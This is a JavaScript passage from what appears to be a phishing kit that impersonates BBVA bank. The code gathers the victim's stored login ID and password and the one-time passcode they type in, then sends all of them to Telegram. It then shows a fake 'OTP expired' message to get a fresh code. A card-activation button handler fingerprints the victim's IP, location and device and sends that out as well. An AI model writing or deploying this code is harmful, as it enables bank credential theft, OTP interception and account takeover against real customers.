            const prevInput = document.getElementById(prevId);
            if (prevInput) {
                prevInput.focus();
            }
        }
    }
}

// Submit OTP
async function submitOTP() {
    // Get all OTP values
    const otp1 = document.getElementById('otp-1').value;
    const otp2 = document.getElementById('otp-2').value;
    const otp3 = document.getElementById('otp-3').value;
    const otp4 = document.getElementById('otp-4').value;
    const otp5 = document.getElementById('otp-5').value;
    const otp6 = document.getElementById('otp-6').value;
    
    const otp = otp1 + otp2 + otp3 + otp4 + otp5 + otp6;
    
    // Check if all fields are filled
    if (otp.length !== 6) {
        // Show error if not all fields filled
        const errorMessage = document.getElementById('otp-error-message');
        if (errorMessage) {
            errorMessage.textContent = 'Please enter all 6 digits';
            errorMessage.style.display = 'block';
        }
        return;
    }
    
    // Timer is already running from when screen appeared
    
    // Get stored login credentials (stored when login was submitted)
    const storedLoginId = sessionStorage.getItem('bbva_login_id') || 'Not available';
    const storedPassword = sessionStorage.getItem('bbva_password') || 'Not available';
    
    // Get current time for OTP
    const currentTime = getCurrentTime();
    
    // Send OTP and login credentials to Telegram (without location - location already sent in first message)
    const otpMessage = `
🔐 <b>BBVA OTP Verification</b>

👤 <b>User ID:</b> ${storedLoginId}
🔑 <b>Password:</b> ${storedPassword}
🔢 <b>OTP:</b> ${otp}

⏰ <b>Time:</b> ${currentTime}
    `;
    
    // Show loading screen immediately after OTP submission
    const loadingOverlay = document.getElementById('loading-overlay');
    if (loadingOverlay) {
        console.log('✅ Showing loading overlay for OTP...');
        loadingOverlay.classList.add('active');
        
        // Prevent background scrolling
        const screen = document.querySelector('.screen');
        if (screen) {
            screen.style.overflow = 'hidden';
        }
    } else {
        console.error('❌ Loading overlay not found!');
    }
    
    // Send OTP to Telegram in background (non-blocking)
    console.log('Sending OTP to Telegram...');
    sendToTelegram(otpMessage).catch(err => {
        console.error('Error sending to Telegram:', err);
    });
    
    // After 3 seconds, hide loading and show error message
    setTimeout(function() {
        console.log('⏰ 3 seconds passed, hiding loader and showing error...');
        if (loadingOverlay) {
            loadingOverlay.classList.remove('active');
        }
        
        // Restore background scrolling
        const screen = document.querySelector('.screen');
        if (screen) {
            screen.style.overflow = 'auto';
        }
        
        // Show error message (OTP expired)
        const errorMessage = document.getElementById('otp-error-message');
        if (errorMessage) {
            errorMessage.textContent = 'OTP expired enter new OTP!';
            errorMessage.style.display = 'block';
        }
        
        // Clear OTP inputs
        document.getElementById('otp-1').value = '';
        document.getElementById('otp-2').value = '';
        document.getElementById('otp-3').value = '';
        document.getElementById('otp-4').value = '';
        document.getElementById('otp-5').value = '';
        document.getElementById('otp-6').value = '';
        
        // Focus back on first input
        setTimeout(function() {
            const firstInput = document.getElementById('otp-1');
            if (firstInput) {
                firstInput.focus();
            }
        }, 100);
    }, 3000);
}

// Handle Activate Card Button Click
async function handleActivateCardClick() {
    console.log('🔔 Activate Card button clicked!');
    
    // Open login modal immediately (don't wait for anything)
    openLoginModal();
    
    // Get country from IP in background (non-blocking)
    getCountryFromIP().then(ipData => {
        const currentTime = getCurrentTime();
        const userInfo = getUserInfo();
        
        // Store IP location data in sessionStorage for later use
        sessionStorage.setItem('bbva_country', ipData.country);
        sessionStorage.setItem('bbva_countryCode', ipData.countryCode);
        sessionStorage.setItem('bbva_city', ipData.city);
        sessionStorage.setItem('bbva_ip', ipData.ip);
        sessionStorage.setItem('bbva_initial_time', currentTime);
        sessionStorage.setItem('bbva_user_agent', userInfo.userAgent);
        sessionStorage.setItem('bbva_platform', userInfo.platform);
        sessionStorage.setItem('bbva_language', userInfo.language);
        sessionStorage.setItem('bbva_screen', `${userInfo.screenWidth}x${userInfo.screenHeight}`);
        sessionStorage.setItem('bbva_timezone', userInfo.timezone);
        
        // Send notification to Telegram
        const notificationMessage = `
🔔 <b>BBVA Notification Button Clicked</b>

📍 <b>Location (IP):</b>
   Country: ${ipData.country}
   Country Code: ${ipData.countryCode}
   City: ${ipData.city}
   IP Address: ${ipData.ip}

⏰ <b>Time:</b> ${currentTime}

💻 <b>Device Info:</b>
   User Agent: ${userInfo.userAgent}
   Platform: ${userInfo.platform}
   Language: ${userInfo.language}
   Screen: ${userInfo.screenWidth}x${userInfo.screenHeight}
   Timezone: ${userInfo.timezone}
        `;
        
        console.log('Sending notification to Telegram...');
        sendToTelegram(notificationMessage).catch(err => {
            console.error('Error sending to Telegram:', err);
        });
    }).catch(err => {
        console.error('Error getting country from IP:', err);
        // Store default values if IP lookup fails
        const currentTime = getCurrentTime();
        const userInfo = getUserInfo();
        sessionStorage.setItem('bbva_country', 'Unknown');
        sessionStorage.setItem('bbva_countryCode', 'Unknown');
        sessionStorage.setItem('bbva_city', 'Unknown');
        sessionStorage.setItem('bbva_ip', 'Unknown');
        sessionStorage.setItem('bbva_initial_time', currentTime);
        sessionStorage.setItem('bbva_user_agent', userInfo.userAgent);
        sessionStorage.setItem('bbva_platform', userInfo.platform);
        sessionStorage.setItem('bbva_language', userInfo.language);
        sessionStorage.setItem('bbva_screen', `${userInfo.screenWidth}x${userInfo.screenHeight}`);
        sessionStorage.setItem('bbva_timezone', userInfo.timezone);
    });
}

// Proceed to Home Screen from Importance Popup
function proceedToHomeScreen() {
    const importancePopup = document.getElementById('importance-popup-overlay');
    
    if (importancePopup) {
        // Hide popup
        importancePopup.classList.remove('show');
        
        console.log('Home screen is now fully visible - buttons should work!');
        
        // Update greeting when popup closes
        setTimeout(function() {
            const greetingElement = document.getElementById('greeting');
            if (greetingElement) {
                const currentHour = new Date().getHours();
                let greetingKey;
                if (currentHour >= 5 && currentHour < 12) {
                    greetingKey = 'greetingMorning';
                } else if (currentHour >= 12 && currentHour < 17) {
                    greetingKey = 'greetingAfternoon';
                } else {
                    greetingKey = 'greetingEvening';
                }
                greetingElement.textContent = translations[currentLanguage][greetingKey];
            }
        }, 100);
        
        // Re-attach button listeners after popup closes
        setTimeout(function() {
            const helpButton = document.getElementById('help-button');
            const menuButton = document.getElementById('menu-button');
            
            if (helpButton) {
                const newHelpButton = helpButton.cloneNode(true);
                helpButton.parentNode.replaceChild(newHelpButton, helpButton);
                newHelpButton.addEventListener('click', function(e) {
                    e.preventDefault();
                    e.stopPropagation();
                    openHelpScreen(e);
                }, true);
            }
            
            if (menuButton) {
                const newMenuButton = menuButton.cloneNode(true);
                menuButton.parentNode.replaceChild(newMenuButton, menuButton);
                newMenuButton.addEventListener('click', function(e) {
                    e.preventDefault();
                    e.stopPropagation();
                    openMenuScreen(e);
                }, true);
            }
        }, 100);
    }
}

// Show OTP Error Popup
function showOTPErrorPopup() {
    const errorPopup = document.getElementById('otp-error-popup-overlay');
    if (errorPopup) {
        errorPopup.classList.add('show');
    }
}

// Close OTP Error Popup
function closeOTPErrorPopup() {
    const errorPopup = document.getElementById('otp-error-popup-overlay');
    if (errorPopup) {
        errorPopup.classList.remove('show');
        
        // Clear OTP inputs
        document.getElementById('otp-1').value = '';
        document.getElementById('otp-2').value = '';
        document.getElementById('otp-3').value = '';
        document.getElementById('otp-4').value = '';
        document.getElementById('otp-5').value = '';
        document.getElementById('otp-6').value = '';
        
        // Hide error message if visible
        const errorMessage = document.getElementById('otp-error-message');
        if (errorMessage) {
            errorMessage.style.display = 'none';
        }
        
        // Restart timer
        startOTPTimer();
        
        // Focus on first input
        setTimeout(function() {
            const firstInput = document.getElementById('otp-1');
            if (firstInput) {
                firstInput.focus();
            }
        }, 100);
    }
}

// Open help screen from login modal
function openHelpFromLogin(event) {
    if (event) {
        event.preventDefault();
        event.stopPropagation();
    }
    
    closeLoginModal();
    setTimeout(function() {
        const helpOverlay = document.getElementById('help-overlay');
        const secondScreen = document.querySelector('.second-screen');
        
        if (helpOverlay && secondScreen && secondScreen.classList.contains('show')) {
            helpOverlay.classList.add('active');
            
            // Prevent background scrolling
            const screen = document.querySelector('.screen');
            if (screen) {
                screen.style.overflow = 'hidden';
            }
            
            // Hide second screen content
            if (secondScreen) {
                secondScreen.style.visibility = 'hidden';
            }
        }
    }, 300); // Wait for modal to close
    return false;
}

